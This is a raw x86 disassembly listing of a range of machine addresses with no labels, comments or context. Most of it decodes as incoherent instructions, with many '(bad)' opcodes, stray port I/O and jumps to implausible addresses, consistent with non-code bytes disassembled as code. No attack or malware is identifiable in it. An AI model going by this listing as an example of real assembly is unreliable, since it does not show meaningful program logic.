  470689:	outs   dx,BYTE PTR ds:[esi]
  47068a:	mov    ebx,eax
  47068c:	jl     0x470639
  47068e:	mov    ecx,DWORD PTR [ebx-0x22]
  470691:	add    bh,BYTE PTR [edi-0x3f]
  470694:	fdiv   DWORD PTR [ecx]
  470696:	test   al,0xc1
  470698:	jmp    0xac3a4f9f
  47069d:	pop    ecx
  47069e:	loope  0x470629
  4706a0:	ror    BYTE PTR [ecx-0x55f4f51e],1
  4706a6:	shr    DWORD PTR [edx],1
  4706a8:	mov    eax,0x5bd801cc
  4706ad:	fsub   QWORD PTR [esi]
  4706af:	ins    BYTE PTR es:[edi],dx
  4706b0:	(bad)  
  4706b1:	mov    edi,0x1b8b0444
  4706b6:	jmp    0x4706a5
  4706b8:	cmp    esp,edx
  4706ba:	je     0x4706d9
  4706bc:	pop    ebx
  4706bd:	mov    ecx,DWORD PTR [ebx]
  4706bf:	add    ebx,0x1a
  4706c2:	jae    0x4706d4
  4706c4:	into   
  4706c5:	test   BYTE PTR [edi-0x30],cl
  4706c8:	inc    BYTE PTR [esi]
  4706ca:	mov    edi,DWORD PTR [ebx+0x14]
  4706cd:	mov    DWORD PTR [edi+eax*1],esi
  4706d0:	push   ds
  4706d1:	sbb    al,0xa6
  4706d3:	cmp    BYTE PTR [ebp-0x1d],dh
  4706d6:	sub    DWORD PTR [eax-0x5388a401],esi
  4706dc:	(bad)  
  4706dd:	mov    esi,DWORD PTR [esi]
  4706df:	mov    edx,DWORD PTR [esi-0x40]
  4706e2:	mov    esi,DWORD PTR [esi+0x78]
  4706e5:	sub    al,BYTE PTR [edi]
  4706e7:	mov    BYTE PTR [edi-0x27c203d6],bh
  4706ed:	mov    eax,ebx
  4706ef:	dec    edx
  4706f0:	jmp    0x82188e37
  4706f5:	stc    
  4706f6:	sub    BYTE PTR [edx+0x735e3f7f],0x11
  4706fd:	paddd  mm6,QWORD PTR [edx+0x7]
  470701:	bswap  esi
  470703:	add    esp,DWORD PTR [eax+edi*4]
  470706:	dec    ebx
  470707:	xor    al,ah
  470709:	and    edi,edi
  47070b:	loope  0x4706c5
  47070d:	fadd   DWORD PTR [ecx]
  47070f:	ror    DWORD PTR [ecx+0x2cd87215],0xfe
  470716:	adc    ecx,ebp
  470718:	dec    edx
  470719:	les    ebx,FWORD PTR [edi+0x28f08317]
  47071f:	(bad)  
  470720:	push   edi
  470721:	out    dx,al
  470722:	xor    bl,cl
  470724:	call   0x51f0:0x47b2081a
  47072b:	jbe    0x470764
  47072d:	cmp    eax,DWORD PTR [ecx-0x74c70a53]
  470733:	xlat   BYTE PTR ds:[ebx]
  470734:	pop    edi
  470735:	daa    
  470736:	test   BYTE PTR [edi-0x4d],cl
  470739:	lock xor al,0x98
  47073c:	cmp    ah,al
  47073e:	adc    al,0x14
  470740:	in     al,dx
  470741:	pop    eax
  470742:	mov    eax,ds:0x89d67070
  470747:	adc    edx,DWORD PTR [edx]
  470749:	and    al,0x22
  47074b:	mov    esi,edx
  47074d:	das    
  47074e:	in     al,dx
  47074f:	fiadd  WORD PTR [ecx]
  470751:	cld    
  470752:	sbb    cl,BYTE PTR [ebp+0x5041f84d]
  470758:	sbb    BYTE PTR [ecx+0x46],bl
  47075b:	fadd   st,st(3)
  47075d:	arpl   WORD PTR [esi],sp
  47075f:	mov    ah,0x44
  470761:	mov    ebp,0x1dd136e6
  470766:	inc    edi
  470767:	ror    DWORD PTR [edi],0x95
  47076a:	je     0x470744
  47076c:	mov    ebx,0x5800d07d
  470771:	cmp    DWORD PTR ds:[edx-0xf3e53c7],0xffffff8b
  470779:	ret    
  47077a:	pop    edi
  47077b:	push   ebp
  47077c:	xor    BYTE PTR [edi+eiz*1-0x47bc7421],bh
  470783:	shr    BYTE PTR [ecx],1
  470785:	mov    al,0x1c
  470787:	mov    esi,DWORD PTR [eax*8+0x3b32e957]
  47078e:	xor    BYTE PTR [edx+esi*2+0x4],ch
  470792:	cmp    esi,DWORD PTR [eax+0x4]
  470795:	hlt    
  470796:	push   cs
  470797:	or     BYTE PTR [ecx+edx*4-0x30],ch
  47079b:	fmul   QWORD PTR [eax]
  47079d:	jne    0x4707a7
  47079f:	or     al,0x22
  4707a1:	je     0x4707b6
  4707a3:	inc    eax
  4707a4:	pop    eax
  4707a5:	popa   
  4707a6:	sbb    bl,BYTE PTR [esi]
  4707a8:	pop    edx
  4707a9:	fsubr  QWORD PTR [ebx+0x6ea131c5]
  4707af:	mov    esp,0xd24df6f
  4707b4:	into   
  4707b5:	add    eax,edx
  4707b7:	daa    
  4707b8:	nop
  4707b9:	fnop   
  4707bb:	sub    BYTE PTR [eax+0x38],dl
  4707be:	ss mov al,0x1
  4707c1:	lods   eax,DWORD PTR ds:[esi]
  4707c2:	dec    eax
  4707c3:	(bad)  
  4707c4:	cmp    ebx,DWORD PTR [edi-0x40]
  4707c7:	push   ss
  4707c8:	mov    ecx,eax
  4707ca:	mov    ecx,DWORD PTR [ecx]
  4707cc:	cmp    ecx,edx
  4707ce:	scas   al,BYTE PTR es:[edi]
  4707cf:	dec    ecx
  4707d0:	jle    0x47079b
  4707d2:	clc    
  4707d3:	lock mov edi,0xb0f375f1
  4707d9:	or     dh,BYTE PTR [ebx-0x70]
  4707dc:	push   edi
  4707dd:	xchg   esi,eax
  4707de:	jmp    0x4707e2
  4707e0:	loop   0x470860
  4707e2:	sar    al,1
  4707e4:	mov    edi,0xd700ba9
  4707e9:	aam    0xf
  4707eb:	push   ecx
  4707ec:	add    edi,0x2
  4707ef:	repnz scas ax,WORD PTR es:[edi]
  4707f2:	je     0x4707fe
  4707f4:	pop    ecx
  4707f5:	pop    es
  4707f6:	call   FWORD PTR [edi-0x4c]
  4707f9:	add    eax,0x58c334f6
  4707fe:	add    eax,eax
  470800:	sub    eax,ecx
  470802:	mov    esi,DWORD PTR [edi+eax*2-0x4]
  470806:	pop    edi
  470807:	push   ax
  470809:	mov    esi,0x8846ee8b
  47080e:	retf   
  47080f:	or     BYTE PTR [ecx+0x58],bl
  470812:	add    bh,bh
  470814:	out    0x59,al
  470816:	mov    WORD PTR [esi],ds
  470818:	jo     0x4707cd
  47081a:	and    eax,edi
  47081c:	out    dx,eax
  47081d:	mov    al,BYTE PTR cs:[eax]
  470820:	cmp    eax,edx
  470822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  470823:	aaa    
  470824:	mov    esi,0x68a5a2f6
  470829:	mov    bl,0xb6
  47082b:	xchg   esi,eax
  47082c:	rol    ah,0xe5
  47082f:	inc    esi
  470830:	mov    eax,0xee0cc34d
  470835:	inc    esp
  470836:	or     BYTE PTR [esi],0x27
  470839:	pop    es
  47083a:	push   esi
  47083b:	les    esi,FWORD PTR [edx]
  47083d:	mov    fs,WORD PTR [edx+0x61]
  470840:	(bad)  
  470841:	or     WORD PTR [edi+edx*1],sp
  470845:	data16 ins BYTE PTR es:[edi],dx
  470847:	sar    BYTE PTR [edx],0x51
  47084a:	mov    cl,0x48
  47084c:	mov    bh,0x50
  47084e:	mov    ebp,0x5ef1e858
  470853:	mov    al,0x5e
  470855:	out    dx,al
  470856:	dec    ebp
  470857:	pop    esi
  470858:	clc    
  470859:	in     al,0x61
  47085b:	(bad)
  470860:	mov    bl,BYTE PTR [edx]
  470862:	sar    ebx,1
  470864:	outs   dx,DWORD PTR ds:[esi]
  470865:	pop    ds
  470866:	dec    ebp
  470867:	jo     0x470835
  470869:	mov    dl,BYTE PTR ds:0xc6833e74
  47086f:	add    cl,BYTE PTR [edx-0x26c7f9b2]
  470875:	sbb    edi,edi
  470877:	test   DWORD PTR [edi+edi*4],0x4fce010e
  47087e:	jne    0x470871
  470880:	add    ebx,ebx
  470882:	jmp    0x47089c
  470884:	push   esp
  470885:	jmp    0x47083c
  470887:	add    BYTE PTR [edx+0x3206315c],cl
  47088d:	jo     0x47090b
  47088f:	fwait
  470890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  470891:	sbb    al,0x80
  470893:	jecxz  0x470883
  470895:	dec    ecx
  470896:	cmp    al,BYTE PTR [esi+0x2]
  470899:	xlat   BYTE PTR ds:[ebx]
  47089a:	in     al,0xf2
  47089c:	je     0x470855
  47089e:	lahf   
  47089f:	push   eax
  4708a0:	popf   
  4708a1:	enter  0x614,0x7d
  4708a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4708a6:	adc    eax,0x7781868
  4708ab:	call   0xee1b:0xeb5adcf2
  4708b2:	xchg   ebp,eax
  4708b3:	imul   ebx,DWORD PTR [edi-0x1714cdae],0xffffff9f
  4708ba:	in     eax,dx
  4708bb:	push   es
  4708bc:	pop    edx
  4708bd:	add    eax,edx
  4708bf:	mov    ds:0xe9b1dc21,eax
  4708c4:	push   edx
  4708c5:	push   ecx
  4708c6:	push   ebx
  4708c7:	pop    edx
  4708c8:	jl     0x4708cd
  4708ca:	inc    edx
  4708cb:	hlt    
  4708cc:	xor    edx,edx
  4708ce:	mov    DWORD PTR ds:0x6450ffff,0x19891a8b
  4708d8:	mov    DWORD PTR [ecx+0x8],ebp
  4708db:	mov    DWORD PTR [ecx+0x4],0x89cc397d
  4708e2:	inc    ecx
  4708e3:	or     al,0x20
  4708e5:	stos   BYTE PTR es:[edi],al
  4708e6:	mov    cl,0x47
  4708e8:	inc    ebp
  4708e9:	or     ch,dh
  4708eb:	pop    edx
  4708ec:	or     eax,0x2c42cc2a
  4708f1:	hlt    
  4708f2:	hlt    
  4708f3:	or     edx,ebx
  4708f5:	mov    ah,0xc
  4708f7:	and    BYTE PTR [eax],cl
  4708f9:	mov    dl,0x81
  4708fb:	push   eax
  4708fc:	stos   BYTE PTR es:[edi],al
  4708fd:	pop    eax
  4708fe:	stos   BYTE PTR es:[edi],al
  4708ff:	aaa    
  470900:	(bad)  
  470901:	not    ecx
  470903:	or     BYTE PTR ds:0xff1097e0,ch
  470909:	push   edx
  47090a:	clc    
  47090b:	xchg   DWORD PTR [ebp+0x19175272],edi
  470911:	in     al,0x83
  470913:	outs   dx,BYTE PTR ds:[esi]
  470914:	jg     0x470917
  470916:	jne    0x47094b
  470918:	jbe    0x470928
  47091a:	sbb    BYTE PTR [ebx],ah
  47091c:	call   0x3dc7cf7b
  470921:	sub    BYTE PTR [edi+0x0],bh
  470924:	add    edi,esp
  470926:	mov    eax,0xc9117601
  47092b:	int3   
  47092c:	(bad)  
  47092e:	in     eax,dx
  47092f:	push   cs
  470930:	call   FWORD PTR [ebx+0x14]
  470933:	es (bad) 
  470935:	adc    eax,0xa0377814
  47093a:	pop    ss
  47093b:	push   eax
  47093c:	pusha  
  47093d:	push   es
  47093e:	rcl    DWORD PTR [eax+0x26a5477],cl
  470944:	cmp    ah,ah
  470946:	xor    ah,al
  470948:	retf   
  470949:	and    eax,0x2ecf734f
  47094e:	add    eax,esp
  470950:	add    al,0xad
  470952:	rol    DWORD PTR [edx+0x3609af61],0x73
  470959:	add    al,0x67
  47095b:	or     bh,dl
  47095d:	call   DWORD PTR [edi-0x69]
  470960:	cmp    eax,0x23535007
  470965:	dec    esi
  470966:	aam    0x19
  470968:	mov    eax,DWORD PTR [ecx+0x1]
  47096b:	cmp    BYTE PTR [ecx],0xe9
  47096e:	je     0x47097c
  470970:	push   es
  470971:	stos   BYTE PTR es:[edi],al
  470972:	jmp    FWORD PTR [edi+0x8]
  470975:	jmp    0x4709ec
  470977:	or     al,0xf
  470979:	mov    esi,0xeb4141c0
  47097e:	add    eax,DWORD PTR [ebx+0x5e1a05c1]
  470984:	cdq    
  470985:	std    
  470986:	dec    eax
  470987:	ret    
  470988:	addr16 sbb eax,0x51482a81
  47098e:	jecxz  0x470971
  470990:	jbe    0x4709b2
  470992:	xor    BYTE PTR ds:0x52128f16,cl
  470998:	aas    
  470999:	sbb    BYTE PTR [esi],dh
  47099b:	cmp    BYTE PTR [edx+eiz*8+0x5a],ah
  47099f:	fdivr  QWORD PTR [ebx]
  4709a1:	adc    BYTE PTR [edi],ch
  4709a3:	je     0x470978
  4709a5:	es (bad) 
  4709a7:	jecxz  0x4709e2
  4709a9:	pop    eax
  4709aa:	(bad)  
  4709ab:	adc    dh,bh
  4709ad:	inc    eax
  4709ae:	pop    ebp
  4709af:	mov    al,ds:0x840481af
  4709b4:	jne    0x38c835cd
  4709ba:	fdivp  st(3),st
  4709bc:	outs   dx,DWORD PTR ds:[esi]
  4709bd:	mov    ebp,0x484542d5
  4709c2:	adc    al,0x74
  4709c4:	outs   dx,BYTE PTR ds:[esi]
  4709c5:	nop
  4709c6:	and    eax,0x10158b68
  4709cb:	pop    esi
  4709cc:	int    0xd0
  4709ce:	jmp    0x47097a
  4709d0:	xchg   esp,eax
  4709d1:	je     0xf71991c8
  4709d7:	adc    ah,bh
  4709d9:	inc    edi
  4709da:	les    ecx,FWORD PTR [edx+0x38]
  4709dd:	mov    ds:0xd2b814c,al
  4709e2:	sub    eax,0xface39fe
  4709e7:	out    dx,eax
  4709e8:	push   cs
  4709e9:	je     0x470a22
  4709eb:	or     eax,0x762c72e4
  4709f0:	sub    DWORD PTR [ebx+ecx*2-0x1f],eax
  4709f4:	or     eax,0x5e207785
  4709f9:	imul   BYTE PTR [eax+0x1b]
  4709fc:	add    BYTE PTR [edi],0x4c
  4709ff:	cmp    BYTE PTR [eax],al
  470a01:	pop    eax
  470a02:	jbe    0x4709af
  470a04:	ss jbe 0x470a7a
  470a07:	xchg   esi,eax
  470a08:	dec    ecx
  470a09:	cmc    
  470a0a:	enter  0xeb0c,0x30
  470a0e:	adc    eax,0x741c175
  470a13:	jns    0x470a16
  470a15:	jbe    0x470a35
  470a17:	adc    eax,0x5face50
  470a1c:	inc    BYTE PTR [ecx+0x58]
  470a1f:	push   eax
  470a20:	jns    0x470a00
  470a22:	je     0x470a94
  470a24:	or     DWORD PTR [eax+0x4],0x2
  470a28:	fsubrp st(0),st
  470a2a:	mov    al,0xc3
  470a2c:	and    al,0x2
  470a2e:	push   edx
  470a2f:	sbb    edx,DWORD PTR [ebx+0x38]
  470a32:	adc    al,0x34
  470a34:	mov    esp,0xb4280ee0
  470a39:	push   eax
  470a3a:	push   0x52a83ba8
  470a3f:	mov    eax,0x55277718
  470a44:	jmp    0x3632c7
  470a49:	mov    al,0x0
  470a4b:	fstp   TBYTE PTR [ebx+0x37]
  470a4e:	ss push esp
  470a50:	mov    al,ds:0x78086f1d
  470a55:	mov    DWORD PTR [edi+0x4],0xbe9550d4
  470a5c:	out    dx,al
  470a5d:	lock add ebx,0x5
  470a61:	test   eax,0xbbe3ff34
  470a66:	pop    edi
  470a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  470a68:	fucomip st,st(7)
  470a6a:	out    dx,eax
  470a6b:	mov    BYTE PTR [ebp+0x11],cl
  470a6e:	mov    DWORD PTR [eax+0x3408410f],edx
  470a74:	xor    BYTE PTR es:[eax+0x61a190f0],bh
  470a7b:	retf   0x6f57
  470a7e:	je     0x470a9f
  470a80:	mov    cl,0x96
  470a82:	daa    
  470a83:	ret    
  470a84:	dec    ebx
  470a85:	or     al,0x53
  470a87:	add    DWORD PTR [eax+0x74],ebp
  470a8a:	xor    BYTE PTR [eax+0x5a78b53a],cl
  470a90:	cwde   
  470a91:	push   edi
  470a92:	or     BYTE PTR [edi+0x15],bh
  470a95:	loope  0x470ad8
  470a97:	add    DWORD PTR [edx+0x718d0559],edx
  470a9d:	or     DWORD PTR [ecx-0x7054503b],ecx
  470aa3:	dec    esp
  470aa4:	add    BYTE PTR [eax+0x2cef8943],cl
  470aaa:	aas    
  470aab:	add    al,BYTE PTR [ebp-0x8]
  470aae:	or     eax,0x680f886
  470ab3:	fdivr  DWORD PTR [ebx]
  470ab5:	dec    edi
  470ab6:	fdiv   DWORD PTR [ebp+0x17]
  470ab9:	mov    WORD PTR [ebx-0x7b9c8082],cs
  470abf:	push   edi
  470ac0:	xchg   edx,eax
  470ac1:	mov    dh,0x9
  470ac3:	inc    eax
  470ac4:	inc    edx
  470ac5:	mov    esi,0xa474d81f
  470aca:	or     esi,esp
  470acc:	fisttp DWORD PTR [edx-0x992381]
  470ad2:	jne    0x470aa4
  470ad4:	test   BYTE PTR [ebx+0x75],0xc0
  470ad8:	mov    al,ds:0x486f0a38
  470add:	ror    DWORD PTR [edi+ebp*2-0xe8875f2],0x41
  470ae5:	jmp    DWORD PTR [ebx-0x1a]
  470ae8:	sbb    al,0x27
  470aea:	push   ds
  470aeb:	push   es
  470aec:	cmp    DWORD PTR [edx+0x149f1541],edx
  470af2:	adc    al,0x13
  470af4:	push   eax
  470af5:	push   esp
  470af6:	daa    
  470af7:	adc    eax,0xa2d90a6d
  470afc:	lds    ebp,FWORD PTR [edx]
  470afe:	add    eax,0x300f562f
  470b03:	cmp    eax,0xe28845d
  470b08:	pop    ebx
  470b09:	adc    DWORD PTR [edx],ecx
  470b0b:	pop    esp
  470b0c:	push   ecx
  470b0d:	cld    
  470b0e:	add    al,0xc0
  470b10:	dec    esp
  470b11:	or     eax,0x63ff202a
  470b16:	add    al,0xf
  470b18:	or     al,0x2b
  470b1a:	sbb    al,0x2
  470b1c:	popf   
  470b1d:	pop    ss
  470b1e:	dec    BYTE PTR [esi+0x3f]
  470b21:	fcomp  QWORD PTR [edi]
  470b23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  470b24:	mov    DWORD PTR [edx+0x4],0x6ac39cb4
  470b2b:	or     BYTE PTR [edx-0x11e33ce9],al
  470b31:	test   eax,0x47d1ff68
  470b36:	outs   dx,DWORD PTR ds:[esi]
  470b37:	or     DWORD PTR [eax],esp
  470b39:	mov    eax,0xa4d3fead
  470b3e:	fdivr  DWORD PTR [eax-0x18]
  470b41:	pop    edx
  470b42:	push   esp
  470b43:	push   ebp
  470b44:	push   edi
  470b45:	push   esi
  470b46:	push   ebx
  470b47:	mov    ebx,0x50702a07
  470b4c:	adc    DWORD PTR [esi-0x7eda9b87],ebp
  470b52:	sbb    ch,ch
  470b54:	mov    ebx,0xc730bef9
  470b59:	mov    dh,0x2f
  470b5b:	int3   
  470b5c:	sbb    esp,edx
  470b5e:	dec    edi
  470b5f:	lock xor dl,BYTE PTR [eax+0x422b890a]
  470b66:	or     al,0x83
  470b68:	pusha  
  470b69:	add    al,0xfd
  470b6b:	sbb    eax,0xf7bb0306
  470b70:	or     eax,0xcf387e1c
  470b75:	enter  0x1b09,0xba
  470b79:	mov    BYTE PTR [ecx],dh
  470b7b:	mov    al,ds:0x59102214
  470b80:	fld    DWORD PTR [edx-0xabf84b3]
  470b86:	lea    edx,[ecx-0x7dda2f8d]
  470b8c:	stc    
  470b8d:	pop    edx
  470b8e:	mov    esp,DWORD PTR [esp+0x2c]
  470b92:	jmp    0x6f89:0x8c0c5dac
  470b99:	ins    DWORD PTR es:[edi],dx
  470b9a:	nop
  470b9b:	jmp    edx
  470b9d:	ret    
  470b9e:	xor    DWORD PTR [ebp-0x2d],esp
  470ba1:	pop    ecx
  470ba2:	mov    eax,0x32960da0
  470ba7:	add    dl,BYTE PTR [edx+0x70000cc2]
  470bad:	xor    DWORD PTR [ecx-0x5],0xf
  470bb1:	mov    edx,DWORD PTR [ebp+0x2e]
  470bb4:	add    bh,BYTE PTR ds:0x2c7f1c92
  470bba:	je     0x470b43
  470bbc:	in     eax,dx
  470bbd:	jl     0x470b96
  470bbf:	xchg   BYTE PTR [esi+0x57741511],cl
  470bc5:	sub    eax,0x872d1e05
  470bca:	and    eax,0x7ffffeef
  470bcf:	cmp    eax,0xeb4e7448
  470bd4:	pusha  
  470bd5:	add    eax,0x3fffff71
  470bda:	sub    eax,0x2
  470bdd:	jb     0x470c15
  470bdf:	je     0x470c11
  470be1:	jmp    0x470c35
  470be3:	cmp    eax,0x74115396
  470be8:	cmp    eax,0x6b7dd62d
  470bed:	xchg   ebp,eax
  470bee:	xchg   ebx,eax
  470bef:	cs inc esp
  470bf1:	adc    eax,DWORD PTR [esp]
  470bf4:	jmp    0x470c30
  470bf6:	sub    eax,0x4e2f1dfd
  470bfb:	(bad)  
  470bfc:	sti    
  470bfd:	(bad)  
  470bfe:	(bad)  
  470bff:	cmp    eax,0x2ceb2674
  470c04:	mov    al,0xc8
  470c06:	jmp    0x470c32
  470c08:	mov    al,0xc9
  470c0a:	jmp    0x470c32
  470c0c:	mov    al,0xcd
  470c0e:	jmp    0x470c32
  470c10:	mov    al,0xcf
  470c12:	jmp    0x470c32
  470c14:	push   ds
  470c15:	sbb    dh,BYTE PTR [eax-0x4fe91429]
  470c1b:	into   
  470c1c:	adc    BYTE PTR [eax],cl
  470c1e:	(bad)  
  470c1f:	(bad)  
  470c20:	jmp    0x470c34
  470c22:	mov    al,0xd8
  470c24:	jmp    0x470c34
  470c26:	mov    al,0xda
  470c28:	jmp    0x470c34
  470c2a:	mov    al,0xd9
  470c2c:	jmp    0x470c34
  470c2e:	mov    al,0xca
  470c30:	test   BYTE PTR [ebx+0x606836b3],ch
  470c36:	call   DWORD PTR [ecx+0x5df10c52]
  470c3c:	mov    al,0x60
  470c3f:	adc    dh,dh
  470c41:	inc    edi
  470c42:	sahf   
  470c43:	jnp    0x470c61
  470c45:	ja     0x470c7f
  470c47:	jg     0x470c58
  470c49:	lea    esi,[edx]
  470c4b:	jns    0x470cc1
  470c4d:	jno    0x470ca0
  470c4f:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  470c51:	push   0xffffff93
  470c53:	outs   dx,DWORD PTR ds:[esi]
  470c54:	jp     0x470c5e
  470c56:	data16 aas 
  470c58:	pop    ss
  470c59:	cmp    eax,0xa85c9afa
  470c5e:	cmp    esp,DWORD PTR [ecx+0x18431e53]
  470c64:	je     0x470c16
  470c66:	push   edx
  470c67:	push   ebx
  470c68:	sbb    BYTE PTR ds:0x8922fa05,0xd8
  470c6f:	out    dx,al
  470c70:	cmp    edi,DWORD PTR [ebx+0x16ee0909]
  470c76:	inc    edx
  470c77:	sti    
  470c78:	sub    ch,BYTE PTR [ebx+ecx*4-0x27bdfbf3]
  470c7f:	add    BYTE PTR [edi],al
  470c81:	add    esp,DWORD PTR [esi-0x2647d6aa]
  470c87:	sbb    eax,0x353614e5
  470c8c:	push   ecx
  470c8d:	adc    al,0x92
  470c8f:	pop    ecx
  470c90:	xor    DWORD PTR [ecx],esp
  470c92:	xchg   cl,al
  470c94:	or     DWORD PTR [edi-0x52],esi
  470c97:	mov    dl,0xdf
  470c99:	test   ecx,esp
  470c9b:	push   eax
  470c9c:	inc    edx
  470c9d:	or     ah,BYTE PTR [esp+ebx*8-0x7617df38]
  470ca4:	push   0xe10f7dca
  470ca9:	or     BYTE PTR [ebx-0x5ec013c8],ah
  470caf:	adc    eax,0xef85d70d
  470cb4:	xor    BYTE PTR [edx+ecx*2],bl
  470cb7:	cmp    eax,ecx
  470cb9:	xchg   BYTE PTR [eax],al
  470cbb:	push   esi
  470cbc:	repnz or DWORD PTR [ecx+eax*1-0x67c0050],eax
  470cc4:	push   DWORD PTR [eax+ecx*1+0x39]
  470cc8:	add    DWORD PTR [ebp-0xb],esi
  470ccb:	and    BYTE PTR [edi+edi*4+0x3f61c057],al
  470cd2:	mov    esi,0x8464434
  470cd7:	bound  edx,QWORD PTR [ebx+ecx*4+0x5e]
  470cdb:	les    ebx,FWORD PTR [eax]
  470cdd:	jo     0x470ce1
  470cdf:	add    ah,ch
  470ce1:	mov    ebx,0x527c9803
  470ce6:	pop    ebp
  470ce7:	inc    eax
  470ce8:	push   cs
  470ce9:	sbb    ecx,DWORD PTR [ebx-0x77]
  470cec:	lods   eax,DWORD PTR ss:[esi]
  470cee:	sbb    DWORD PTR [ebx-0x78],0x3ed844f4
  470cf5:	fcomp  QWORD PTR [esi-0x78]
  470cf8:	in     eax,dx
  470cf9:	dec    esi
  470cfa:	adc    al,0xff
  470cfc:	push   ebp
  470cfd:	clc    
  470cfe:	xor    al,0x7f
  470d00:	in     eax,0xe5
  470d02:	jmp    0x470d18
  470d04:	mov    al,ds:0xbf11822c
  470d09:	xchg   esi,eax
  470d0a:	xor    BYTE PTR [esp+ecx*2],al
  470d0d:	cmp    eax,esp
  470d0f:	and    eax,0xdfe33488
  470d14:	mov    edi,0xb91ed321
  470d19:	inc    edi
  470d1a:	xor    BYTE PTR [ebx],dh
  470d1c:	fndisi(8087 only) 
  470d1e:	int    0xb1
  470d20:	pop    ebp
  470d21:	mov    bh,0xfb
  470d23:	cmp    esi,ebx
  470d25:	jle    0x470d41
  470d27:	fld    DWORD PTR [eax+ebx*8]
  470d2a:	(bad)  
  470d2b:	rcr    BYTE PTR [edi+0xc],0xdf
  470d2f:	cmp    bh,BYTE PTR ds:0xf33bf900
  470d35:	jg     0x470d1d
  470d37:	mov    DWORD PTR ds:0x9f36fc15,0x12723266
  470d41:	sbb    BYTE PTR [edx+edx*1],al
  470d44:	mov    ds:0x3c0d783c,eax
  470d49:	add    al,0x29
  470d4b:	inc    eax
  470d4c:	call   0xe0325166
  470d51:	ins    DWORD PTR es:[edi],dx
  470d52:	xor    cl,BYTE PTR [edi]
  470d54:	jmp    0xbc2f:0x723a2ca3
  470d5b:	mov    BYTE PTR ds:0xb0293634,0x1b
  470d62:	dec    esp
  470d63:	lahf   
  470d64:	je     0x470d29
  470d66:	ds mov edx,0x44473c8b
  470d6c:	push   ebp
  470d6d:	pop    ss
  470d6e:	push   ss
  470d6f:	sbb    BYTE PTR [esi+0x46],dl
  470d72:	push   es
  470d73:	fsubr  DWORD PTR [edx-0x1]
  470d76:	add    bh,bl
  470d78:	add    edx,ebx
  470d7a:	xor    al,0x4f
  470d7c:	jo     0x470df4
  470d7e:	dec    edi
  470d7f:	jne    0x470d6d
  470d81:	pop    esi
  470d82:	pop    edi
  470d83:	pop    ebx
  470d84:	inc    edi
  470d85:	inc    edx
  470d86:	sbb    DWORD PTR [eax+0x41],ebx
  470d89:	pusha  
  470d8a:	sbb    BYTE PTR [ecx-0x15],cl
  470d8d:	jne    0x470d8f
  470d8f:	pop    es
  470d90:	fsub   DWORD PTR [esi]
  470d92:	dec    edi
  470d93:	add    eax,DWORD PTR [esi-0x4e]
  470d96:	sbb    bh,BYTE PTR [ebx+esi*4-0x3b]
  470d9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  470d9b:	xchg   esi,eax
  470d9c:	or     al,0x13
  470d9e:	ins    BYTE PTR es:[edi],dx
  470d9f:	pusha  
  470da0:	mov    cl,0x10
  470da2:	mov    ebx,DWORD PTR ds:0xc0cff800
  470da8:	outs   dx,DWORD PTR ds:[esi]
  470da9:	fadd   st,st(3)
  470dab:	mov    edi,0xfff799ae
  470db0:	add    dl,0x30
  470db3:	jl     0x470d59
  470db5:	mov    ebp,0x88c13803
  470dba:	adc    al,0x6
  470dbc:	es mov ebx,0x49d88bfb
  470dc2:	sub    dh,BYTE PTR [ebp-0x21]
  470dc5:	and    eax,0x1cb1db70
  470dca:	mov    eax,ds:0xa8d05704
  470dcf:	push   esp
  470dd0:	push   0x1b
  470dd2:	out    dx,al
  470dd3:	mov    dl,BYTE PTR [edx-0x7561eb74]
  470dd9:	fst    DWORD PTR [edx+0x1e]
  470ddc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  470ddd:	jbe    0x470dfb
  470ddf:	mov    ds:0xe65a40cb,al
  470de4:	fbstp  TBYTE PTR [edx-0x79]
  470de7:	add    eax,0xef86700b
  470dec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  470ded:	neg    eax
  470def:	sbb    eax,eax
  470df1:	inc    eax
  470df2:	call   FWORD PTR [edi+0x18]
  470df5:	test   BYTE PTR [edi+edi*8],dl
  470df8:	stos   BYTE PTR es:[edi],al
  470df9:	sbb    eax,0x1c77dbea
  470dfe:	add    al,0x20
  470e00:	mov    esi,DWORD PTR [edi]
  470e02:	mov    ecx,0x58a5380b
  470e07:	leave  
  470e08:	cli    
  470e09:	(bad)  
  470e0a:	sub    bl,BYTE PTR [edx+0x48e65147]
  470e10:	popa   
  470e11:	push   edi
  470e12:	cmp    WORD PTR ds:0xb37c0b1c,0xd4
  470e1b:	push   0x243d8314
  470e20:	add    BYTE PTR [esp+eax*2],0x57
  470e24:	mov    ah,0xd6
  470e26:	or     edi,DWORD PTR [eax+0xa34cc24]
  470e2c:	jmp    0x6a29:0x9fc1b07a
  470e33:	push   ds
  470e34:	push   0xf4f56a75
  470e39:	add    eax,esi
  470e3b:	daa    
  470e3c:	in     al,0x87
  470e3e:	jge    0x470e87
  470e40:	adc    BYTE PTR ds:0x42ac6802,dh
  470e46:	inc    eax
  470e47:	pop    edx
  470e48:	ret    
  470e49:	stos   BYTE PTR es:[edi],al
  470e4a:	loopne 0x470e54
  470e4c:	ins    BYTE PTR es:[edi],dx
  470e4d:	mov    esi,0x9e396030
  470e52:	shl    DWORD PTR fs:[eax],cl
  470e55:	fucomp st(4)
  470e57:	adc    bh,BYTE PTR [ebp+0x0]
  470e5a:	cmp    ebp,DWORD PTR [eax]
  470e5c:	add    DWORD PTR [ebx-0x67d63db5],eax
  470e62:	or     eax,0x6c1f6eda
  470e67:	lock and BYTE PTR [ecx-0x45],dl
  470e6b:	addr16 mov esi,0x7b802644
  470e71:	sub    BYTE PTR [esi+edx*1-0x7d],ch
  470e75:	ds xor eax,0xc406b89c
  470e7b:	push   es
  470e7c:	mov    edx,0x82570488
  470e81:	imul   eax,DWORD PTR [esi],0xefb440ff
  470e87:	inc    edx
  470e88:	sub    eax,0x191cefbe
  470e8d:	xor    cl,BYTE PTR [esi+0x32089431]
  470e93:	and    al,bl
  470e95:	adc    eax,0x27cfdaf0
  470e9a:	push   0x2
  470e9c:	jne    0x470eac
  470e9e:	ds add bl,ch
  470ea1:	jp     0x470ed9
  470ea3:	and    esi,ebp
